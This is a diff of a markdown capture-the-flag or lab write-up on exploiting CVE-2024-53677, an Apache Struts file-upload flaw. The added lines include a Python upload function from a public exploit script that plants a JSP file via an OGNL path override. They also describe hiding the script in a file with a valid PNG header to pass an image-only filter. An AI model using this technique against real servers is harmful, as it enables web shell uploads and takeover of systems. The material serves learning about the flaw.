@@ -46,7 +46,27 @@ As we can upload file, googling CVE for this version, there is [CVE-2024-53677](
 
 I tried the exploit in the above posts, but it does not work directly. The working of the exploit is also not straight forward. So, I look deeper into what causes the vulnerability and how can we craft our exploit. This post explains quite well: https://help.tanium.com/bundle/CVE-2024-31497/page/VERT/CVE-2024-53677/Understanding_Apache_Struts.htm.
 
-We can have alook athe 
+We can have a look at the EQSTLab's exploit script. 
+```python
+def exploit(self) -> None:
+        files = {
+            'Upload': ("exploit_file.jsp", self.file_content, 'text/plain'),
+            'top.UploadFileName': (None, self.path),
+        }
+
+        try:
+            response = requests.post(self.url, files=files)
+            print("Status Code:", response.status_code)
+            print("Response Text:", response.text)
+            if response.status_code == 200:
+                print("File uploaded successfully.")
+            else:
+                print("Failed to upload file.")
+        except requests.exceptions.RequestException as e:
+            print(f"Request failed: {e}")
+```
+
+It upload "two" files within same request but with different "name".
 
 So, Struts has a series of Interceptor classes that run by default, including one called the `FileUploadInterceptor`. Struts has this concept of the object graph navigation library (OGNL), which has a stack. If there are two objects on the stack, and it allows referencing some property, say `name`, and that will work down the stack looking for the first object that has that property and return that.
 If a POST request triggers the `FileUploadInterceptor`, you can have other POST parameters that reference parts of that object by the OGNL stack. In practice, that looks like:
@@ -87,6 +107,9 @@ The first form data parameter will be processed into an object by the `FileUploa
 NOTE: One important thing to consider which I found after reading about custom payload, the first file upload needs to have `name=Upload` with an Upper case `U`. Otherwise this exploit does not work.
 ![[Pasted image 20250905175120.png]]
 
+This portal only allows image upload. Upload any other file format fails. However, any image file with valid magic header can be uploaded even though the rest of the file is corrupted. So we can sort of embed the script inside the "PNG" file keeping the header same as PNG and providing path i.e. writing the file to a path which we can access/read.
+
+However, we cannot access the file directly at `/uploads/[date]/[filename]`. As per the code, it actually provides us with a sharable link at endpoint `/s`. 
 
 
 
